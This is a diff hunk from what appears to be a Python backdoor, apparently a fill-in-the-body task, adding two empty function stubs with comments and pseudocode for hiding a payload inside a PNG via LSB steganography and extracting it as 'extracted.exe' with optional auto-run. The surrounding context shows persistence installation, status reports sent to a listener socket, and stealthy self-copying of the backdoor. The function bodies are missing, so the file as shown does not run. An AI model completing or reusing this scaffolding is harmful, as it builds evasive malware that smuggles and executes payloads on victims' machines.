@@ -299,6 +299,32 @@ def install_persistence(sock):
     print(f"[!] {error_msg}")
     sock.send(f"PERSIST_ERR|{error_msg}".encode("utf-8"))
 
+
+
+# Hides a payload file inside a carrier image using Least Significant Bit (LSB) steganography.
+# Preconditions: payload_path and carrier_path point to valid files, output_path is writable, and carrier is a PNG image.
+# Postconditions: Creates a new PNG image that visually looks identical to the original but contains the hidden payload in the least significant bits of the pixels.
+# Pseudocode:
+# 1. Read and compress the payload
+# 2. Convert compressed payload to binary
+# 3. Embed each bit into the LSB of RGB pixel values
+# 4. Save the modified image as PNG
+def hide_file_in_image(payload_path, carrier_path, output_path):
+
+
+# Extracts a hidden payload from an image that was embedded using LSB steganography.
+# Preconditions: image_path points to a PNG containing LSB hidden data.
+# Postconditions: Extracts and decompresses the payload, saves it to output_filename, and optionally executes it.
+# Pseudocode:
+# 1. Read all pixel LSBs and build binary string
+# 2. Look for end marker to know when payload ends
+# 3. Convert binary back to bytes, decompress, and save
+# 4. Auto-run if requested
+def extract_from_image(image_path, output_filename="extracted.exe", auto_run=False):
+
+
+
+
 # Deploys the backdoor in a stealthy manner by copying itself to a new location with a new name and optionally hiding it within a carrier image.
 # Preconditions: new_name, new_path, and carrier_img are provided, and sock is a connected socket.
 # Postconditions: The backdoor is copied to the new location, optionally hidden in a carrier image, and a success or error message is sent back to the listener.
